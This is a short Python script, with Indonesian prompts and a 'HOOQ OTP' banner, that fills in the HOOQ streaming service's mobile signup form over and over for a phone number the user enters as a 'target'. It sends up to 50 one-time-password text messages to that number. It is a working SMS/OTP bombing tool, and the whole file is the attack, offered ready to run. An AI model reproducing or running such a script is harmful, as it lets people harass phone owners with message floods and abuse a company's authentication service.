try:
	import mechanize,os,sys,time
	
	print("""\033[97m
 _   _  _____  _____  _____    _____  ____  ____ 
( )_( )(  _  )(  _  )(  _  )  (  _  )(_  _)(  _ \\
 ) _ (  )(_)(  )(_)(  )(_)(    )(_)(   )(   )___/
(_) (_)(_____)(_____)(___/\\\  (_____) (__) (__)  
""")
	br = mechanize.Browser()
	br.set_handle_equiv(True)
	br.set_handle_gzip(True)
	br.set_handle_redirect(True)
	br.set_handle_referer(True)
	br.set_handle_robots(False)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	br.addheaders = [("User-Agent","Mozilla/8.0 (Linux; U; Android 8.1)")]
	
	def send(no):
		br.open('https://authenticate.hooq.tv/signupmobile?returnUrl=https://m.hooq.tv%2Fauth%2Fverify%2Fev%2F%257Cdiscover&serialNo=c3125cc0-f09d-4c7f-b7aa-6850fabd3f4e&deviceType=webClient&modelNo=webclient-aurora&deviceName=webclient-aurora/production-4.2.0&deviceSignature=02b480a474b7b2c2524d45047307e013e8b8bc0af115ff5c3294f787824998e7')
		br.select_form(nr=0)
		br.form["mobile"] = no
#		br.form["password"] = "KangNewbieNoobea"
		res=br.submit().read()
		#print(res)
		if 'confirmotp' in str(res):
			print(i+1,"sukses mengirim OTP")
		else: print(i+1,"gagal mengirim OTP")
		#return True
	no=int(input("[?] Nomor target: "))
	jlm=int(input("[?] jumlah: "))
	print()
	if jlm > 50:
		exit("[!] kalo tidak mau script ini koid ngirimnya jangan banyak-banyak bosque")
	for i in range(jlm):
		send(str(no))
		time.sleep(1)
	
except KeyboardInterrupt: exit("[exit] key interrupt")
except Exception as F: print("Err: %s"%(F))
